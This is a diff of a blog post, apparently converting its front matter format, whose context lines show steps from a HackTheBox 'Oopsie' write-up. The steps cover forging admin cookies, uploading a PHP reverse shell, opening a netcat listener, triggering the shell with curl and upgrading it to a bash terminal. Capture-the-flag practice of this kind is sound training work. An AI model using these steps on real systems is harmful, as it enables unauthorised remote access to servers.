@@ -1,7 +1,7 @@
----
-title: "HackTheBox Write-up&mdash;Oopsie"
-date: 2021-03-22
----
++++
+title = "HackTheBox Write-up&mdash;Oopsie"
+date = 2021-03-22
++++
 
 This machine is found at IP `10.10.10.28`, and was quite fun to hack.
 
@@ -15,7 +15,7 @@ This machine is found at IP `10.10.10.28`, and was quite fun to hack.
 6. Using these super admin cookie parameters, you can upload a [reverse shell file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to the server, but be sure to change the [IP address in the script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php#L49) to yours (`tun0` on Linux; on my mac when connected to ethernet it was the `utun2` connection);
 7. In a new terminal window, run `nc6 -nlvp 1234` (or just `nc` on Linux);
 8. Now you want to, in a new terminal window, `curl http://10.10.10.28/uploads/php-reverse-shell.php`. This will activate the listener in your other window;
-9. In the listener window, you now have a web shell. To turn it into a better terminal, run 
+9. In the listener window, you now have a web shell. To turn it into a better terminal, run
     ```bash
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     ```
